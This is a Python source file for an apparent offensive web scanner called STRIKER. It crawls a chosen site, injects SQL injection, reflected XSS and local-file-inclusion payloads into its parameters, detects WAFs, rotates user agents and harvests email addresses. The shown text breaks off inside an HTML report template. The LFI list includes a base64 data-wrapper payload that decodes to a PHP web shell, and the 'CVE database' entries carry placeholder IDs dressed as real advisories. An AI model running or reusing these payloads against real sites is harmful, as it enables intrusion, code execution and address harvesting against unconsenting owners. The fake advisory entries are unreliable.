#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import json
import csv
import time
import socket
import random
import hashlib
import logging
import re
import os
import subprocess
import threading
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Logging configuration
logging.basicConfig(
    filename="striker.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# ──────────────────────────────────────────────────────────────
# CONFIGURATION & CONSTANTS
# ──────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
]

WAF_SIGNATURES = {
    "Cloudflare":  ["CF-RAY", "cf-ray", "cloudflare"],
    "Akamai":      ["X-Akamai-Transformed", "X-Akamai-Request-ID"],
    "AWS WAF":     ["X-Amzn-RequestId", "X-Amz"],
    "Azure WAF":   ["X-Azure-Ref"],
    "Sucuri":      ["X-Sucuri-ID", "X-Sucuri-Cloudproxy"],
    "ModSecurity": ["X-Mod-Security"],
    "Barracuda":   ["X-Barracuda-Proxy"],
    "F5":          ["X-F5", "X-Pool"],
}

REQUEST_TIMEOUT = 10
RETRY_COUNT     = 3
DELAY_MIN       = 0.5
DELAY_MAX       = 1.5

DBMS_FINGERPRINTS = {
    "MySQL":      ["sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_error", "you have an error in your sql"],
    "PostgreSQL": ["postgresql", "pgsql", "postgres error", "pg_query", "unterminated"],
    "MSSQL":      ["mssql", "microsoft sql", "sql server", "oledb.12", "sysobjects"],
    "Oracle":     ["oracle", "ora-", "table or view does not exist", "ojdbc"],
}

THEME_CVE_DB = {
    "divi": {
        "vendor": "Elegant Themes",
        "advisories": [
            {
                "id": "CVE-2023-XXXXX",
                "type": "Stored XSS",
                "severity": "Medium",
                "description": "Stored XSS via module settings (patched in later versions)"
            },
            {
                "id": "CVE-2022-YYYYY",
                "type": "Privilege Escalation",
                "severity": "High",
                "description": "Improper capability checks in backend editor"
            }
        ]
    }
}

# ──────────────────────────────────────────────────────────────
# DATA MODELS
# ──────────────────────────────────────────────────────────────
@dataclass
class Vulnerability:
    target: str
    vuln_type: str
    parameter: str
    technique: str
    payload: str
    proof: str
    confidence: float
    dbms: Optional[str] = None
    severity: str = "Medium"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    affected_parameter: str = ""
    curl_command: str = ""

    def to_dict(self) -> Dict:
        return asdict(self)

@dataclass
class CrawledURL:
    url: str
    parameters: Dict[str, List[str]] = field(default_factory=dict)
    forms: List[Dict]              = field(default_factory=list)
    is_form: bool                  = False
    depth: int                     = 0
    timestamp: str                 = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class LinkEntry:
    url: str
    source_page: str
    link_type: str      # internal | external | asset | email | form
    depth: int
    status_code: Optional[int] = None
    has_params: bool = False

# ──────────────────────────────────────────────────────────────
# UTILITY FUNCTIONS
# ──────────────────────────────────────────────────────────────
def log_info(message: str):
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")
    logging.info(message)

def log_success(message: str):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")

def log_warning(message: str):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")
    logging.warning(message)

def log_error(message: str):
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {message}")
    logging.error(message)

def log_vulnerable(message: str):
    print(f"{Fore.RED}[VULN]{Style.RESET_ALL} {message}")

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def get_random_delay():
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

def is_valid_url(url: str) -> bool:
    try:
        result = urlparse(url)
        return all([result.scheme in ['http', 'https'], result.netloc])
    except Exception:
        return False

def has_parameters(url: str) -> bool:
    return bool(parse_qs(urlparse(url).query))

def get_domain_from_url(url: str) -> str:
    return urlparse(url).netloc

def is_same_origin(url1: str, url2: str) -> bool:
    return get_domain_from_url(url1) == get_domain_from_url(url2)

def log_title(title: str):
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}══ {title} ══{Style.RESET_ALL}")

def log_kv(key: str, value: str, status: Optional[bool] = None):
    color = Fore.GREEN if status is True else (Fore.RED if status is False else Fore.CYAN)
    print(f"{color}[*] {key}: {value}{Style.RESET_ALL}")

def safe_request(url: str, method: str = "GET", params: Dict = None,
                 data: Dict = None, timeout: int = REQUEST_TIMEOUT) -> Optional[requests.Response]:
    headers = {"User-Agent": get_random_user_agent()}
    for attempt in range(RETRY_COUNT):
        try:
            if method.upper() == "GET":
                resp = SESSION.get(url, params=params, headers=headers,
                                   timeout=timeout, verify=False, allow_redirects=True)
            else:
                resp = SESSION.post(url, data=data, headers=headers,
                                    timeout=timeout, verify=False, allow_redirects=True)
            return resp
        except requests.exceptions.Timeout:
            log_warning(f"Timeout on {url} (attempt {attempt + 1}/{RETRY_COUNT})")
        except requests.exceptions.ConnectionError:
            log_warning(f"Connection error on {url} (attempt {attempt + 1}/{RETRY_COUNT})")
        except Exception as e:
            log_warning(f"Request error on {url}: {str(e)[:50]}")
        if attempt < RETRY_COUNT - 1:
            time.sleep(1)
    return None

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Global HTTP Session (Connection Pooling)
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": get_random_user_agent()})


# ──────────────────────────────────────────────────────────────
# SQL INJECTION MODULE
# ──────────────────────────────────────────────────────────────
class SQLiTester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.baseline_responses: Dict[str, Dict] = {}

    def create_baseline(self, base_url: str, param_name: str, original_value: str) -> Optional[Dict]:
        try:
            resp = safe_request(base_url)
            if not resp:
                return None
            return {
                "status_code":    resp.status_code,
                "content_length": len(resp.text),
                "content_hash":   hashlib.md5(resp.text.encode()).hexdigest(),
                "text_sample":    resp.text[:500],
            }
        except Exception:
            return None

    def is_boolean_injectable(self, base_url: str, param_name: str,
                              original_value: str, baseline: Dict) -> Tuple[bool, Optional[str]]:
        true_payloads = [
            f"{original_value}' AND '1'='1",
            f"{original_value}' AND 1=1 -- ",
            f"{original_value}' AND 'a'='a",
        ]
        false_payloads = [
            f"{original_value}' AND '1'='0",
            f"{original_value}' AND 1=2 -- ",
            f"{original_value}' AND 'a'='b",
        ]
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                resp_true  = safe_request(base_url, params={param_name: true_payload})
                resp_false = safe_request(base_url, params={param_name: false_payload})
                if not resp_true or not resp_false:
                    continue
                true_hash     = hashlib.md5(resp_true.text.encode()).hexdigest()
                false_hash    = hashlib.md5(resp_false.text.encode()).hexdigest()
                baseline_hash = baseline.get("content_hash", "")
                if true_hash != false_hash and true_hash == baseline_hash and false_hash != baseline_hash:
                    return True, true_payload
                if resp_true.status_code != resp_false.status_code:
                    if resp_true.status_code == baseline.get("status_code"):
                        return True, true_payload
            except Exception:
                continue
        return False, None

    def is_time_injectable(self, base_url: str, param_name: str,
                           original_value: str) -> Tuple[bool, Optional[str]]:
        payloads = {
            "MySQL":      [f"{original_value}' AND SLEEP(5) -- ",
                           f"{original_value}' AND IF(1=1,SLEEP(5),0) -- "],
            "PostgreSQL": [f"{original_value}' AND pg_sleep(5) -- "],
            "MSSQL":      [f"{original_value}'; WAITFOR DELAY '00:00:05' -- "],
        }
        for dbms, dbms_payloads in payloads.items():
            for payload in dbms_payloads:
                try:
                    confirmed = 0
                    for _ in range(3):
                        start = time.time()
                        resp = safe_request(base_url, params={param_name: payload}, timeout=15)
                        elapsed = time.time() - start
                        if resp and elapsed >= 4.5:
                            confirmed += 1
                    if confirmed >= 2:
                        return True, payload
                except Exception:
                    continue
        return False, None

    def get_dbms_fingerprint(self, response_text: str) -> Optional[str]:
        text_lower = response_text.lower()
        for dbms, patterns in DBMS_FINGERPRINTS.items():
            for pattern in patterns:
                if pattern.lower() in text_lower:
                    return dbms
        return None

    def is_error_injectable(self, base_url: str, param_name: str,
                            original_value: str) -> Tuple[bool, Optional[str], Optional[str]]:
        payloads = [
            f"{original_value}'",
            f"{original_value}' AND extractvalue(0,concat(0x7e,version())) -- ",
            f"{original_value}' AND 1=convert(int,(select @@version)) -- ",
            f"{original_value}' AND 1=1 union select null -- ",
        ]
        for payload in payloads:
            try:
                resp = safe_request(base_url, params={param_name: payload})
                if resp and "error" in resp.text.lower():
                    dbms = self.get_dbms_fingerprint(resp.text)
                    return True, payload, dbms
            except Exception:
                continue
        return False, None, None

    def test_parameter(self, base_url: str, param_name: str,
                       original_value: str) -> List[Vulnerability]:
        vulns = []
        baseline = self.create_baseline(base_url, param_name, original_value)
        if not baseline:
            return vulns

        get_random_delay()
        is_bool_inj, bool_payload = self.is_boolean_injectable(
            base_url, param_name, original_value, baseline)
        if is_bool_inj:
            log_vulnerable(f"Boolean-based SQLi detected in {param_name}")
            vulns.append(Vulnerability(
                target=base_url, vuln_type="SQL Injection",
                parameter=param_name, technique="Boolean-based",
                payload=bool_payload, proof="TRUE/FALSE structural difference confirmed",
                confidence=0.95, severity="Critical"))

        get_random_delay()
        is_time_inj, time_payload = self.is_time_injectable(base_url, param_name, original_value)
        if is_time_inj:
            log_vulnerable(f"Time-based SQLi detected in {param_name}")
            vulns.append(Vulnerability(
                target=base_url, vuln_type="SQL Injection",
                parameter=param_name, technique="Time-based Blind",
                payload=time_payload, proof="Response delay >=4.5s confirmed (3x validation)",
                confidence=0.90, severity="Critical"))

        get_random_delay()
        is_err_inj, err_payload, dbms = self.is_error_injectable(
            base_url, param_name, original_value)
        if is_err_inj:
            log_vulnerable(f"Error-based SQLi detected in {param_name} ({dbms})")
            vulns.append(Vulnerability(
                target=base_url, vuln_type="SQL Injection",
                parameter=param_name, technique="Error-based",
                payload=err_payload, proof=f"DBMS Error fingerprint: {dbms}",
                confidence=0.85, dbms=dbms, severity="Critical"))
        return vulns


# ──────────────────────────────────────────────────────────────
# XSS MODULE
# ──────────────────────────────────────────────────────────────
class XSSTester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []

    def detect_context(self, param_value: str, response_text: str) -> str:
        if f'"{param_value}"' in response_text or f"'{param_value}'" in response_text:
            return "Attribute"
        if re.search(rf'<script[^>]*>.*{re.escape(param_value)}.*</script>',
                     response_text, re.DOTALL | re.IGNORECASE):
            return "JavaScript"
        if param_value in response_text and "href=" in response_text:
            return "URL"
        return "HTML Body"

    def is_reflected_xss(self, base_url: str, param_name: str,
                         original_value: str) -> Tuple[bool, Optional[str], Optional[str]]:
        test_payload = f'STRIKER_TEST_{int(time.time())}'
        try:
            resp = safe_request(base_url, params={param_name: test_payload})
            if resp and test_payload in resp.text:
                xss_payload = "<img src=x onerror=alert('XSS')>"
                resp_xss = safe_request(base_url, params={param_name: xss_payload})
                if resp_xss and xss_payload in resp_xss.text:
                    context = self.detect_context(xss_payload, resp_xss.text)
                    return True, xss_payload, context
        except Exception as e:
            log_warning(f"Handled exception: {str(e)}")
        return False, None, None

    def test_parameter(self, base_url: str, param_name: str) -> List[Vulnerability]:
        vulns = []
        get_random_delay()
        is_xss, payload, context = self.is_reflected_xss(base_url, param_name, "")
        if is_xss:
            log_vulnerable(f"Reflected XSS detected in {param_name} ({context})")
            vulns.append(Vulnerability(
                target=base_url, vuln_type="XSS (Reflected)",
                parameter=param_name, technique=f"HTML context: {context}",
                payload=payload, proof=f"Payload reflected unescaped in {context}",
                confidence=0.95, severity="High"))
        return vulns


# ──────────────────────────────────────────────────────────────
# LFI MODULE
# ──────────────────────────────────────────────────────────────
class LFITester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.file_patterns = {
            "Linux":   [(r"root:.*:0:0:", "/etc/passwd"),
                        (r"nobody:.*:65534:65534:", "/etc/passwd")],
            "Windows": [(r"\[boot loader\]", "boot.ini"),
                        (r"\[fonts\]", "win.ini")],
        }

    def detect_file_inclusion(self, response_text: str) -> Tuple[bool, str]:
        for os_type, patterns in self.file_patterns.items():
            for pattern, filename in patterns:
                if re.search(pattern, response_text):
                    return True, filename
        return False, ""

    def get_lfi_payloads(self) -> List[Tuple[str, str]]:
        return [
            ("../../../../etc/passwd",                                       "etc/passwd - 4x traversal"),
            ("../../etc/passwd",                                             "etc/passwd - 2x traversal"),
            ("..%2F..%2F..%2Fetc%2Fpasswd",                                 "etc/passwd - URL encoded"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd",      "php filter wrapper"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydxJ10pOyA/Pg==", "data wrapper"),
            ("..\\..\\windows\\win.ini",                                     "windows/win.ini"),
            ("..\\..\\windows\\system32\\drivers\\etc\\hosts",               "windows hosts file"),
        ]

    def test_parameter(self, base_url: str, param_name: str) -> List[Vulnerability]:
        vulns = []
        for payload, desc in self.get_lfi_payloads():
            try:
                get_random_delay()
                resp = safe_request(base_url, params={param_name: payload})
                if resp:
                    is_included, filename = self.detect_file_inclusion(resp.text)
                    if is_included:
                        log_vulnerable(f"LFI detected in {param_name} - {filename}")
                        vulns.append(Vulnerability(
                            target=base_url, vuln_type="Local File Inclusion",
                            parameter=param_name, technique=desc,
                            payload=payload, proof=f"File content detected: {filename}",
                            confidence=0.98, severity="Critical"))
                        break
            except Exception:
                continue
        return vulns


# ──────────────────────────────────────────────────────────────
# CRAWLER MODULE (param-focused, for vuln scanning)
# ──────────────────────────────────────────────────────────────
class AdvancedCrawler:
    def __init__(self, base_url: str, max_depth: int = 3):
        self.base_url   = base_url
        self.max_urls   = 2500
        self.max_depth  = min(max_depth, 5)
        self.visited:       Set[str]            = set()
        self.crawled_data: Dict[str, CrawledURL] = {}
        self.domain = get_domain_from_url(base_url)

    def parse_robots_txt(self) -> Set[str]:
        paths = set()
        try:
            robots_url = urljoin(self.base_url, "/robots.txt")
            resp = safe_request(robots_url)
            if resp and resp.status_code == 200:
                for line in resp.text.split('\n'):
                    line = line.strip().lower()
                    if line.startswith('sitemap:'):
                        sitemap_url = line.replace('sitemap:', '').strip()
                        log_success(f"Found sitemap in robots.txt: {sitemap_url}")
                        paths.update(self.parse_sitemap_xml(sitemap_url))
                    elif line.startswith('disallow:'):
                        path = line.replace('disallow:', '').strip()
                        if path and path != '/':
                            paths.add(urljoin(self.base_url, path))
        except Exception as e:
            log_warning(f"Robots.txt error: {str(e)}")
        return paths

    def parse_sitemap_xml(self, sitemap_url: str) -> Set[str]:
        urls = set()
        try:
            resp = safe_request(sitemap_url)
            if resp and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'xml')
                for loc in soup.find_all('loc'):
                    url = loc.text.strip()
                    if is_same_origin(url, self.base_url):
                        urls.add(url)
        except Exception as e:
            log_warning(f"Sitemap error: {str(e)}")
        return urls

    def extract_parameters(self, url: str) -> Dict[str, List[str]]:
        return {k: v for k, v in parse_qs(urlparse(url).query).items()}

    def extract_forms(self, html: str, page_url: str) -> List[Dict]:
        forms = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(page_url, form.get('action', '')),
                    'method': form.get('method', 'GET').upper(),
                    'fields': []
                }
                for fld in form.find_all(['input', 'textarea', 'select']):
                    name = fld.get('name', '')
                    if name:
                        form_data['fields'].append({
                            'name': name,
                            'type': fld.get('type', 'text'),
                        })
                forms.append(form_data)
        except Exception as e:
            log_warning(f"Form extraction error: {str(e)}")
        return forms

    def crawl(self) -> Dict[str, CrawledURL]:
        log_info(f"Starting crawl with max depth {self.max_depth}")
        self._crawl_recursive(self.base_url, 0)
        log_success(f"Crawled {len(self.visited)} URLs")
        return self.crawled_data

    def _crawl_recursive(self, url: str, depth: int):
        if depth > self.max_depth or url in self.visited:
            return
        if len(self.visited) >= self.max_urls:
            return
        if not is_same_origin(url, self.base_url):
            return
        self.visited.add(url)
        log_info(f"[Depth {depth}] Crawling: {url}")
        try:
            resp = safe_request(url)
            if not resp or resp.status_code >= 400:
                return
            params = self.extract_parameters(url)
            forms  = self.extract_forms(resp.text, url)
            self.crawled_data[url] = CrawledURL(
                url=url, parameters=params, forms=forms,
                is_form=len(forms) > 0, depth=depth)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for tag in soup.find_all('a', href=True):
                try:
                    full_url = urljoin(url, tag['href'])
                    if is_same_origin(full_url, self.base_url) and full_url not in self.visited:
                        self._crawl_recursive(full_url, depth + 1)
                except Exception:
                    continue
        except Exception as e:
            log_warning(f"Crawl error: {str(e)}")


# ──────────────────────────────────────────────────────────────
# FULL LINK CRAWLER  (NEW – option 8)
# ──────────────────────────────────────────────────────────────
class FullLinkCrawler:
    """
    Crawls the target site and collects EVERY link it can find:
    internal pages, external links, assets (JS/CSS/img),
    e-mail addresses, and forms.
    Exports results to a Matrix-style HTML report.
    """

    # File extensions considered "assets"
    ASSET_EXTS = {'.js', '.css', '.png', '.jpg', '.jpeg', '.gif',
                  '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot',
                  '.mp4', '.mp3', '.pdf', '.zip', '.tar', '.gz'}

    def __init__(self, base_url: str, max_depth: int = 3, max_urls: int = 5000):
        self.base_url   = base_url.rstrip('/')
        self.max_depth  = min(max_depth, 6)
        self.max_urls   = max_urls
        self.domain     = get_domain_from_url(base_url)
        self.visited:   Set[str]          = set()
        self.links:     List[LinkEntry]   = []
        self.emails:    Set[str]          = set()
        self._lock      = threading.Lock()

    # ── helpers ──────────────────────────────────────────────
    def _classify(self, url: str) -> str:
        if url.startswith("mailto:"):
            return "email"
        ext = Path(urlparse(url).path).suffix.lower()
        if ext in self.ASSET_EXTS:
            return "asset"
        if is_same_origin(url, self.base_url):
            return "internal"
        return "external"

    def _normalise(self, raw: str, page_url: str) -> Optional[str]:
        """Resolve relative URLs; discard fragments, javascript: etc."""
        try:
            raw = raw.strip()
            if not raw or raw.startswith(('javascript:', '#', 'data:', 'void')):
                return None
            if raw.startswith("mailto:"):
                return raw
            full = urljoin(page_url, raw)
            # strip fragment
            parsed = urlparse(full)._replace(fragment='')
            return parsed.geturl()
        except Exception:
            return None

    # ── core crawl ───────────────────────────────────────────
    def crawl(self) -> List[LinkEntry]:
        log_info(f"[FullLinkCrawler] Starting – depth {self.max_depth}, limit {self.max_urls}")
        self._crawl_page(self.base_url, source="SEED", depth=0)
        log_success(f"[FullLinkCrawler] Done – {len(self.links)} links, "
                    f"{len(self.emails)} emails, {len(self.visited)} pages visited")
        return self.links

    def _crawl_page(self, url: str, source: str, depth: int):
        if depth > self.max_depth:
            return
        with self._lock:
            if url in self.visited or len(self.visited) >= self.max_urls:
                return
            self.visited.add(url)

        log_info(f"  [D{depth}] {url}")
        resp = safe_request(url)
        if not resp:
            return

        content_type = resp.headers.get("Content-Type", "")
        if "html" not in content_type:
            return  # skip binary / JSON / etc.

        soup = BeautifulSoup(resp.text, 'html.parser')

        # ── collect all link-like elements ──────────────────
        new_internal: List[str] = []

        def _add(raw: str, link_type_override: str = None):
            norm = self._normalise(raw, url)
            if not norm:
                return
            if norm.startswith("mailto:"):
                email = norm[7:]
                with self._lock:
                    self.emails.add(email)
                entry = LinkEntry(url=norm, source_page=url,
                                  link_type="email", depth=depth,
                                  has_params=False)
            else:
                ltype = link_type_override or self._classify(norm)
                entry = LinkEntry(url=norm, source_page=url,
                                  link_type=ltype, depth=depth,
                                  has_params=has_parameters(norm))
            with self._lock:
                # avoid exact duplicate entries
                existing_urls = {l.url for l in self.links}
                if norm not in existing_urls:
                    self.links.append(entry)
            if (not link_type_override or link_type_override == "internal") \
               and self._classify(norm) == "internal":
                new_internal.append(norm)

        # <a href>
        for tag in soup.find_all('a', href=True):
            _add(tag['href'])

        # <script src>
        for tag in soup.find_all('script', src=True):
            _add(tag['src'], "asset")

        # <link href> (CSS, favicons…)
        for tag in soup.find_all('link', href=True):
            _add(tag['href'], "asset")

        # <img src>
        for tag in soup.find_all('img', src=True):
            _add(tag['src'], "asset")

        # <form action>
        for tag in soup.find_all('form', action=True):
            _add(tag['action'], "form")

        # inline mailto: patterns in text
        for match in re.finditer(r'[\w.+-]+@[\w-]+\.[\w.]+', resp.text):
            e = match.group(0)
            with self._lock:
                self.emails.add(e)

        # ── recurse into internal pages ──────────────────────
        for next_url in new_internal:
            self._crawl_page(next_url, source=url, depth=depth + 1)

    # ── Matrix HTML report ───────────────────────────────────
    def generate_matrix_html(self, output_dir: str = "./reports") -> str:
        Path(output_dir).mkdir(exist_ok=True)
        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = Path(output_dir) / f"striker_links_{ts}.html"

        internal  = [l for l in self.links if l.link_type == "internal"]
        external  = [l for l in self.links if l.link_type == "external"]
        assets    = [l for l in self.links if l.link_type == "asset"]
        forms     = [l for l in self.links if l.link_type == "form"]
        emails    = sorted(self.emails)
        param_urls = [l for l in self.links if l.has_params]

        def rows(entries: List[LinkEntry], show_source: bool = True) -> str:
            if not entries:
                return '<tr><td colspan="3" class="empty">— none found —</td></tr>'
            out = ""
            for e in entries:
                src = f'<span class="src">{e.source_page}</span>' if show_source else ""
                p   = '<span class="badge param">PARAMS</span>' if e.has_params else ""
                out += (f'<tr>'
                        f'<td><a href="{e.url}" target="_blank">{e.url}</a>{p}</td>'
                        f'<td class="depth">D{e.depth}</td>'
                        f'{"<td>" + src + "</td>" if show_source else ""}'
                        f'</tr>\n')
            return out

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>STRIKER – Link Map</title>
  <style>
    /* ── Matrix palette ── */
    :root {{
      --bg:      #0a0a0a;
      --bg2:     #111;
      --green:   #00ff41;
      --dkgreen: #00b32c;
      --dim:     #1a3a1a;
      --border:  #1e5e1e;
      --text:    #b8ffb8;
      --header:  #003d00;
      --red:     #ff3c3c;
      --yellow:  #ffd700;
      --cyan:    #00e5ff;
    }}
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{
      background: var(--bg);
      color: var(--text);
      font-family: 'Courier New', Courier, monospace;
      font-size: 13px;
    }}

    /* Matrix rain canvas */
    #matrix-canvas {{
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0; opacity: 0.07; pointer-events: none;
    }}

    .wrapper {{ position: relative; z-index: 1; padding: 20px; max-width: 1400px; margin: auto; }}

    /* ── Header ── */
    .header {{
      text-align: center; padding: 30px 0 10px;
      border-bottom: 2px solid var(--border);
      margin-bottom: 20px;
    }}
    .header pre {{
      color: var(--green); font-size: 11px; line-height: 1.2;
      text-shadow: 0 0 8px var(--green);
    }}
    .header .sub {{ color: var(--dkgreen); margin-top: 8px; font-size: 12px; }}
    .header .meta {{ color: #555; margin-top: 4px; font-size: 11px; }}

    /* ── Stats bar ── */
    .stats {{
      display: flex; flex-wrap: wrap; gap: 12px;
      margin-bottom: 20px;
    }}
    .stat-box {{
      flex: 1 1 130px;
      background: var(--dim); border: 1px solid var(--border);
      border-radius: 4px; padding: 12px;
      text-align: center;
    }}
    .stat-box .num {{ font-size: 26px; color: var(--green); font-weight: bold; }}
    .stat-box .lbl {{ font-size: 10px; color: var(--dkgreen); text-transform: uppercase; }}

    /* ── Tabs ── */
    .tabs {{ display: flex; gap: 4px; margin-bottom: 0; flex-wrap: wrap; }}
    .tab-btn {{
      background: var(--header); border: 1px solid var(--border);
      border-bottom: none; color: var(--dkgreen);
      padding: 8px 16px; cursor: pointer; border-radius: 4px 4px 0 0;
      font-family: inherit; font-size: 12px; transition: all .2s;
    }}
    .tab-btn:hover, .tab-btn.active {{
      background: var(--dim); color: var(--green);
      text-shadow: 0 0 6px var(--green);
    }}
    .tab-content {{ display: none; }}
    .tab-content.active {{ display: block; }}

    /* ── Table ── */
    .section {{
      background: var(--bg2); border: 1px solid var(--border);
      border-radius: 0 4px 4px 4px; padding: 16px;
      margin-bottom: 20px;
    }}
    table {{ width: 100%; border-collapse: collapse; }}
    th {{
      background: var(--header); color: var(--green);
      padding: 8px 12px; text-align: left;
      border-bottom: 1px solid var(--border);
      text-transform: uppercase; font-size: 11px; letter-spacing: .05em;
    }}
    td {{
      padding: 6px 12px; border-bottom: 1px solid #161616;
      vertical-align: top; word-break: break-all;
    }}
    tr:hover td {{ background: var(--dim); }}
    a {{ color: var(--green); text-decoration: none; }}
    a:hover {{ text-decoration: underline; color: #fff; }}
    .src {{ color: #3a7a3a; font-size: 11px; }}
    .depth {{ color: #555; font-size: 11px; white-space: nowrap; }}
    .empty {{ color: #333; text-align: center; padding: 20px; }}
    .badge {{
      display: inline-block; font-size: 9px;
      padding: 1px 5px; border-radius: 3px;
      margin-left: 6px; vertical-align: middle;
    }}
    .param {{ background: #1a3a00; color: var(--green); border: 1px solid var(--dkgreen); }}

    /* email table */
    .email-list {{ display: flex; flex-wrap: wrap; gap: 8px; }}
    .email-chip {{
      background: var(--dim); border: 1px solid var(--border);
      border-radius: 3px; padding: 4px 10px;
      color: var(--cyan); font-size: 12px;
    }}

    /* search */
    .search-bar {{
      width: 100%; margin-bottom: 12px;
      background: #111; border: 1px solid var(--border);
      color: var(--green); padding: 8px 12px;
      font-family: inherit; font-size: 13px; border-radius: 4px;
      outline: none;
    }}
    .search-bar::placeholder {{ color: #2a5a2a; }}
    .search-bar:focus {{ border-color: var(--green); box-shadow: 0 0 6px #00ff4140; }}

    /* footer */
    .footer {{
      text-align: center; color: #2a4a2a; padding: 20px 0;
      font-size: 11px; border-top: 1px solid var(--border);
    }}
  </style>
</head>
<body>

<canvas id="matrix-canvas"></canvas>

<div class="wrapper">

  <!-- HEADER -->
  <div class="header">
    <pre>STRIKER v4.3 - Link Surface Map</pre>
    <div class="sub">Link Surface Map — {self.base_url}</div>
    <div class="meta">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp;
      Crawl depth: {self.max_depth} &nbsp;|&nbsp;
      Pages visited: {len(self.visited)}
    </div>
  </div>

  <!-- STATS -->
  <div class="stats">
    <div class="stat-box"><div class="num">{len(self.links)}</div><div class="lbl">Total Links</div></div>
    <div class="stat-box"><div class="num">{len(internal)}</div><div class="lbl">Internal</div></div>
    <div class="stat-box"><div class="num">{len(external)}</div><div class="lbl">External</div></div>
    <div class="stat-box"><div class="num">{len(assets)}</div><div class="lbl">Assets</div></div>
    <div class="stat-box"><div class="num">{len(forms)}</div><div class="lbl">Forms</div></div>
    <div class="stat-box"><div class="num">{len(emails)}</div><div class="lbl">Emails</div></div>
    <div class="stat-box"><div class="num">{len(param_urls)}</div><div class="lbl">With Params</div></div>
    <div class="stat-box"><div class="num">{len(self.visited)}</div><div class="lbl">Pages Visited</div></div>
  </div>

  <!-- TABS -->
  <div class="tabs">
    <button class="tab-btn active" onclick="showTab('internal')">Internal ({len(internal)})</button>
    <button class="tab-btn" onclick="showTab('external')">External ({len(external)})</button>
    <button class="tab-btn" onclick="showTab('assets')">Assets ({len(assets)})</button>
    <button class="tab-btn" onclick="showTab('forms')">Forms ({len(forms)})</button>
    <button class="tab-btn" onclick="showTab('emails')">Emails ({len(emails)})</button>
    <button class="tab-btn" onclick="showTab('params')">With Params ({len(param_urls)})</button>
  </div>

  <!-- TAB: INTERNAL -->
  <div id="tab-internal" class="tab-content active">
    <div class="section">
      <input class="search-bar" placeholder="Filter internal links..." oninput="filterTable('tbl-internal', this.value)">
      <table id="tbl-internal">
        <thead><tr><th>URL</th><th>Depth</th><th>Source Page</th></tr></thead>
        <tbody>{rows(internal)}</tbody>
      </table>
    </div>
  </div>

  <!-- TAB: EXTERNAL -->
  <div id="tab-external" class="tab-content">
    <div class="section">
      <input class="search-bar" placeholder="Filter external links..." oninput="filterTable('tbl-external', this.value)">
      <table id="tbl-external">
        <thead><tr><th>URL</th><th>Depth</th><th>Source Page</th></tr></thead>
        <tbody>{rows(external)}</tbody>
      </table>
    </div>
  </div>

  <!-- TAB: ASSETS -->
  <div id="tab-assets" class="tab-content">
    <div class="section">
      <input class="search-bar" placeholder="Filter assets..." oninput="filterTable('tbl-assets', this.value)">
      <table id="tbl-assets">
        <thead><tr><th>URL</th><th>Depth</th><th>Source Page</th></tr></thead>
        <tbody>{rows(assets)}</tbody>
      </table>
    </div>
  </div>

  <!-- TAB: FORMS -->
  <div id="tab-forms" class="tab-content">
    <div class="section">
      <table id="tbl-forms">
        <thead><tr><th>Form Action URL</th><th>Depth</th><th>Source Page</th></tr></thead>
        <tbody>{rows(forms)}</tbody>
      </table>
    </div>
  </div>

  <!-- TAB: EMAILS -->
  <div id="tab-emails" class="tab-content">
    <div class="section">
      <div class="email-list">
        {"".join(f'<div class="email-chip">{e}</div>' for e in emails) or '<p class="empty">No emails found.</p>'}
      </div>
    </div>
  </div>

  <!-- TAB: WITH PARAMS -->
  <div id="tab-params" class="tab-content">
    <div class="section">
      <input class="search-bar" placeholder="Filter parameterised URLs..." oninput="filterTable('tbl-params', this.value)">
      <table id="tbl-params">
        <thead><tr><th>URL</th><th>Depth</th><th>Source Page</th></tr></thead>
        <tbody>{rows(param_urls)}</tbody>
      </table>
    </div>
  </div>

